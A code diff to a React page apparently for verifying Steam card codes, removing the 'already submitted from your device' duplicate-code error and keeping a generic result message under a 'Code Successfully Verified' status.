@@ -139,11 +139,7 @@ export default function SteamPage() {
                     <span className={styles.statusDot}></span>
                     Code Successfully Verified
                   </div>
-                  {result.isDuplicate ? (
-                    <div className={styles.error} style={{ background: 'rgba(255, 59, 48, 0.1)', color: '#ff453a', border: '1px solid rgba(255, 59, 48, 0.2)', margin: '20px 0', borderRadius: '4px', padding: '12px', fontWeight: '500' }}>
-                      This card code has already been submitted from your device.
-                    </div>
-                  ) : result.message ? (
+                  {result.message ? (
                     <div className={styles.error} style={{ background: 'rgba(255, 255, 255, 0.05)', color: '#fff', border: '1px solid rgba(255, 255, 255, 0.1)', margin: '20px 0', borderRadius: '4px' }}>
                       <span>{result.message}</span>
                     </div>
